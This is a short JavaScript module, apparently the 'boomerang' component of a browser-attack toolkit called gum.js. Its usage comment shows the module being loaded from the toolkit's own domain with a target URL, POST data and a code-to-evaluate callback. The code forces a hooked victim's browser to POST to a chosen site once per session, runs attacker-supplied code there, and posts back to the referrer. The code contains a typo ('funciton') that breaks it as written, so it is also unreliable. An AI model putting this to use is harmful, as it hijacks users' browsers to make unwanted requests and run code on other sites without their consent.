/*
    quininer - 140505
    boomerang - gum.js
        - boomerang
            gum_boomerang = {
            	'object_url':'http://url/path',
            	'post':{'a':'b'},
            	'eval':function(){code}
            };
            gum.script('http://' + gum.domain + '/static/brows/tool_boomerang.js');
        and
            null
*/
(funciton(bdict){
if(document.URL == bdict['object_url'] + '#' + document.referrer ){
    bdict['eval']();
    gum.post(document.referrer, {}, true);
}else{
    if(window.sessionStorage.getItem('gum_boomerangkey') == 'old' || document.URL == bdict['object_url']){}else{
        window.sessionStorage.setItem('gum_boomerangkey','old');
        gum.post(bdict['object_url'] + '#' + document.URL.split('#',1)[0], bdict['post'], true);
    };
};})(gum_boomerang);
